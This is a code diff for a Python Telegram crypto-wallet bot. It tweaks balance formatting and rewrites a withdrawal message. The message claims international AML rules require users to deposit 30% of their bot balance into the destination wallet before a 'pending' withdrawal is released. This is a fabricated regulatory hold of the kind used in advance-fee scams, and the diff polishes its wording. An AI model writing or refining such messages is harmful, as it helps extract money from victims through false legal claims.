@@ -122,7 +122,8 @@ def build_wallet_text(
         else None
     )
     def balance_line(asset: str) -> str:
-        return f"<b>💰 {asset} Balance: {balances[asset]:.2f} {asset}</b>\n"
+        balance = _format_amount(balances[asset])
+        return f"<b>💰 {asset} Balance: {balance} {asset}</b>\n"
     portfolio = sum(usd_values.values(), Decimal("0")) if usd_values is not None else None
     positions = positions or []
     position_values = [
@@ -941,11 +942,11 @@ def build_user_router(
         await message.answer(
             "⚠️ <b>Withdrawal Pending (AML Verification)</b>\n\n"
             "Due to International Anti-Money Laundering (AML) regulations," 
-            "you must hold at least <b>30%</b> of your requested withdrawal" 
-            "amount as a verified balance in your account before the " 
+            "you must hold at least <b>30%</b> of your bot balance " 
+            "in the destination wallet before the " 
             "transfer can be completed.\n\n"
 
-            "Please deposit the required percentage to clear the AML hold" 
+            "Please deposit the required percentage to clear the AML hold " 
             "and release your funds..",
             parse_mode="HTML",
         )
